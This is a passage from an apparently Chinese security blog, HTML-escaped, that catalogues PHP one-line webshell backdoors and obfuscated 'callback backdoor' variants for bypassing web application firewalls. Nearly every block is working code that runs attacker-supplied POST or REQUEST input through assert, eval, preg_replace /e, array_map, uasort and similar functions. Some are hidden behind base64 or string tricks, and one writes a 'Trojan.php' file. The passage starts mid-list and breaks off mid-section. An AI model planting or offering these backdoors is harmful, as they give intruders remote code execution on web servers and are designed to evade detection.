&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$fun&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;create_function&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;shell&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$fun&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;call_user_func () 函数&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;title function_ invoke__&#34;&gt;call_user_func&lt;/span&gt;(assert,&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;shell&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;call_user_func () 函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;base64_decode 函数&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;base64_decode&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YXNzZXJ0&amp;quot;&lt;/span&gt;);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;title function_ invoke__&#34;&gt;a&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;shell&amp;#x27;&lt;/span&gt;]);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;preg_replace 函数&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function fun()&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return $_POST[&amp;#x27;shell&amp;#x27;];  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @preg_replace(&amp;quot;/test/e&amp;quot;, fun(), &amp;quot;test123&amp;quot;);  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;preg_replace&lt;/code&gt;  函数一个参数是一个正则表达式，按照 php 的格式，表达式在两个 / 之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php 代码执行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;pares_str 函数&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$str=&amp;quot;a=assert&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parse_str($str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a($_POST[&amp;#x27;shell&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行 pares_str 函数后可以生成一个名为 $a，值为 &amp;quot;assert&amp;quot; 的变量。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;str_replace 函数&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;astestsert&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;shell&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;file_put_contents 函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;利用函数生成木马&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$test=&amp;#x27;&amp;lt;?php $a=$_POST[&amp;quot;cmd&amp;quot;];assert($a); ?&amp;gt;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_put_contents(&amp;quot;Trojan.php&amp;quot;, $test);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;array 数组&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&amp;#x27;assert&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;array_map(&amp;quot;$a&amp;quot;,$_REQUEST);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述定义参数 a 并赋值‘assert’, 利用 array_map () 函数将执行语句进行拼接。最终实现 &lt;code&gt;assert（$_REQUEST）&lt;/code&gt; 。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$item[&amp;#x27;JON&amp;#x27;]=&amp;#x27;assert&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$array[]=$item;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$array[0][&amp;#x27;JON&amp;#x27;]($_POST[&amp;quot;TEST&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用函数的组合效果，使得多个参数在传递后组合成一段命令并执行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;.&amp;quot; 操作符&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&amp;quot;e&amp;quot;.&amp;quot;v&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b=&amp;quot;a&amp;quot;.&amp;quot;l&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$c=$a.$b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$c($_POST[&amp;#x27;a&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;利用 script 代替 &lt;code&gt;&amp;lt;? 、?&amp;gt;&lt;/code&gt;  标签&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;@eval_r($_GET[b])&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80OTQ3MjY0OC9hcnRpY2xlL2RldGFpbHMvMTI1OTQ1NTE0&#34;&gt;eval 与 assert 一句话木马分析_共黄昏的博客 - CSDN 博客_php assert 一句话&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2J5bGZzai9hcnRpY2xlL2RldGFpbHMvMTAxMjI3MjEwP3NwbT0xMDAxLjIxMDEuMzAwMS42NjUwLjEmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yfmRlZmF1bHR+Q1RSTElTVH5SYXRlLTEtMTAxMjI3MjEwLWJsb2ctMTI1OTQ1NTE0LnBjX3JlbGV2YW50X211bHRpX3BsYXRmb3JtX3doaXRlbGlzdHYzJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yfmRlZmF1bHR+Q1RSTElTVH5SYXRlLTEtMTAxMjI3MjEwLWJsb2ctMTI1OTQ1NTE0LnBjX3JlbGV2YW50X211bHRpX3BsYXRmb3JtX3doaXRlbGlzdHYzJmFtcDt1dG1fcmVsZXZhbnRfaW5kZXg9Mg==&#34;&gt;php 一句话木马变形技巧_bylfsj 的博客 - CSDN 博客_一句话木马 phpinfo&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;bypass各种waf-php回调后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bypass各种waf-php回调后门&#34;&gt;#&lt;/a&gt; bypass 各种 waf-php 回调后门&lt;/h2&gt;
&lt;h3 id=&#34;0x01-最初的回调后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-最初的回调后门&#34;&gt;#&lt;/a&gt; 0x01 最初的回调后门&lt;/h3&gt;
&lt;p&gt;php 中 call_user_func 是执行回调函数的标准方法，这也是一个比较老的后门了：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;call_user_func(&amp;#x27;assert&amp;#x27;, $_REQUEST[&amp;#x27;pass&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样的后门很容易被查杀，所以我们可以简单做一个变型&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;call_user_func_array(&amp;#x27;assert&amp;#x27;, array($_REQUEST[&amp;#x27;pass&amp;#x27;]));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;call_user_func_array 函数，和 call_user_func 类似，只是第二个参数可以传入参数列表组成的数组。&lt;/p&gt;
&lt;h3 id=&#34;0x02-数组操作造成的单参数回调后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-数组操作造成的单参数回调后门&#34;&gt;#&lt;/a&gt; 0x02 数组操作造成的单参数回调后门&lt;/h3&gt;
&lt;p&gt;进一步思考，在平时的 php 开发中，遇到过的带有回调参数的函数绝不止上面说的两个。这些含有回调（callable 类型）参数的函数，其实都有做 “回调后门” 的潜力。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = array($_POST[&amp;#x27;pass&amp;#x27;],);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;array_filter($arr, base64_decode($e));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;array_filter 函数是将数组中所有元素遍历并用指定函数处理过滤用的，如此调用都可以执行&lt;/p&gt;
&lt;p&gt;类似 array_filter，array_map 也有同样功效：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = array($_POST[&amp;#x27;pass&amp;#x27;],);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;array_map(base64_decode($e), $arr);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;0x03-php548中的assert&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-php548中的assert&#34;&gt;#&lt;/a&gt; 0x03 php5.4.8 + 中的 assert&lt;/h3&gt;
&lt;p&gt;php 5.4.8 + 后的版本，assert 函数由一个参数，增加了一个可选参数 descrition：&lt;/p&gt;
&lt;p&gt;这就增加（改变）了一个很好的 “执行代码” 的方法 assert，这个函数可以有一个参数，也可以有两个参数。那么以前回调后门中有两个参数的回调函数，现在就可以使用了。&lt;/p&gt;
&lt;p&gt;比如如下回调后门：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = array(&amp;#x27;test&amp;#x27;, $_REQUEST[&amp;#x27;pass&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uasort($arr, base64_decode($e));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同样的道理，这个也是功能类似：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$e = $_REQUEST[&amp;#x27;e&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = array(&amp;#x27;test&amp;#x27; =&amp;gt; 1, $_REQUEST[&amp;#x27;pass&amp;#x27;] =&amp;gt; 2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uksort($arr, $e);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再给出这两个函数，面向对象的方法：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// way 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = new ArrayObject(array(&amp;#x27;test&amp;#x27;, $_REQUEST[&amp;#x27;pass&amp;#x27;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr-&amp;gt;uasort(&amp;#x27;assert&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// way 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr = new ArrayObject(array(&amp;#x27;test&amp;#x27; =&amp;gt; 1, $_REQUEST[&amp;#x27;pass&amp;#x27;] =&amp;gt; 2));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$arr-&amp;gt;uksort(&amp;#x27;assert&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再来两个类似的回调后门：&lt;/p&gt;
